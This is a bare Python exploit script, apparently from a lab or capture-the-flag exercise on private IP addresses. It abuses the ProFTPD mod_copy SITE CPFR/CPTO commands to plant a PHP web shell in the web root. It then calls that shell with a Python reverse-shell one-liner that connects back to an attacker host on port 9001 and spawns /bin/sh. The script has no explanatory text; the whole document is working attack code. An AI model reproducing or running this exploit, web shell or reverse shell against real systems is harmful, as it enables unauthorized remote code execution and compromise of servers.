#!/usr/bin/env python3

import socket
import requests

revshell_cmd = "python -c 'import os, socket;s=socket.socket();s.connect((\"192.168.229.30\", 9001));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);os.system(\"/bin/sh\")'"

with socket.socket() as s:
        s.connect(('192.168.229.105',21))

        s.send(b"SITE CPFR /proc/self/cmdline\n")
        s.send(b"SITE CPTO /tmp/<?php system($_GET['c']) ?>\n")
        s.send(b"SITE CPFR /tmp/<?php system($_GET['c']) ?>\n")
        s.send(b"SITE CPTO /var/www/html/anything.php\n")

r = requests.get("http://192.168.229.105/anything.php", params = {
	'c': revshell_cmd,})
